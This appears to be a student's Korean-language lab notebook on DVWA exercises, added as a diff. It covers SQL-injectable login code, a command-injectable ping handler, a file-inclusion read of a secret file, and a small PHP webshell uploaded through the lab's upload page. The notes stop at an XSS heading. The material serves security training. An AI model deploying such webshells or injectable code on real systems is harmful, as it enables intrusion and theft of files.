@@ -1,0 +1,161 @@
+---노션---
+https://incredible-guan-388.notion.site/7-5fde64ac4fa44ea0a6c3920109cab2ea?pvs=25
+
+
+# 7일차
+
+# 도커 환경 접속
+
+sudo docker ps -a
+sudo docker exec -it d1d1e7861e8d /bin/bash
+echo "deb http://archive.debian.org/debian stretch main" > /etc/apt/sources.list
+echo "deb http://archive.debian.org/debian-security stretch/updates main" >> /etc/apt/sources.list
+echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99no-check-valid-until
+apt update
+apt install -y vim
+
+### 파일 찾기
+
+find / -name php.ini 2> /dev/null
+
+전부 찾아주삼
+
+/var/www/html/php.ini
+/etc/php5/apache2/php.ini
+/etc/php/7.0/cli/php.ini
+/etc/php/7.0/apache2/php.ini
+
+이 파일로 들어가셈
+
+vi /etc/php5/apache2/php.ini
+
+그다음 수정을 해야함.
+
+d1d1e7861e8d
+
+---
+
+## 여기까지가 오늘 사전작업.
+
+![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a156cc82-d201-4160-ac40-16f8ab23f7dc/f6a76b50-5e9a-4abb-a6dc-5b15df60be68/image.png)
+
+로그인 소스를 깔수도 있음 ㅇㅇ
+
+```php
+Brute Force Source
+vulnerabilities/brute/source/low.php
+<?php
+
+if( isset( $_GET[ 'Login' ] ) ) {
+    // Get username
+    $user = $_GET[ 'username' ];
+
+    // Get password
+    $pass = $_GET[ 'password' ];
+    $pass = md5( $pass );
+
+    // Check the database
+    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+    if( $result && mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row["avatar"];
+
+        // Login successful
+        echo "<p>Welcome to the password protected area {$user}</p>";
+        echo "<img src=\"{$avatar}\" />";
+    }
+    else {
+        // Login failed
+        echo "<pre><br />Username and/or password incorrect.</pre>";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?>
+
+```
+
+## php 코드
+
+```php
+<?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ 'ip' ];
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Feedback for the end user
+    echo "<pre>{$cmd}</pre>";
+}
+
+?>
+```
+
+# 3. File Indusion
+
+-indusion : 포함
+
+- source,lib
+- 잘모소딘 Refeence(참조)
+
+## 파일을 어떻게 가져올수 있을까?
+
+![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a156cc82-d201-4160-ac40-16f8ab23f7dc/00e72662-e05e-4a2a-9b9c-118c31adde93/image.png)
+
+음~청나게 비밀스러운 파일을 훔칠걸임
+
+/home/top_secret.txt ← 이거 이거
+
+![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a156cc82-d201-4160-ac40-16f8ab23f7dc/3c6ec720-5f5c-4f17-884c-72654f6d4ba2/image.png)
+
+주소창에 요로코롬 파일을 참조하고있는데 여기서 우리가 원하는 파일을 넣어주면
+
+### 쨔란! 해킹환료 (읽지 말아야하는 파일을 읽는거임!!)
+
+![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a156cc82-d201-4160-ac40-16f8ab23f7dc/753c7b09-7fc9-422c-b51c-4aeb0dc6c75d/image.png)
+
+# 바이러스 파일을 올려보자!
+
+![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a156cc82-d201-4160-ac40-16f8ab23f7dc/6e8b56ce-a156-4c13-b44e-e379eb719a51/image.png)
+
+- 바이러스 파일
+    
+    ```php
+    <?php 
+    
+    if(isset($_REQUEST['cmd']))
+        $cmd = $_REQUEST['cmd'];
+        $cmd = shell_exec('cat /home/top_secret.txt');
+        echo "<pre>{$cmd}</pre>"; // 이 친구가 명령어 실행임.
+        die;
+    ?>
+    ```
+    
+
+그 다음을
+
+`/hackable/uploads/webshell.php`
+
+이 주소로 가줍니다. 여기로 올렸다는거죠?  ㅡVㅡ!
+
+![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/a156cc82-d201-4160-ac40-16f8ab23f7dc/3faa7de0-6620-4da7-99f3-06e158a108c8/image.png)
+
+고럼 장소로 가면 짜란 여기로 갈수 있습니다.
+
+# Stired Cross Site Scripting
+
+Cross-site scripting (xss)
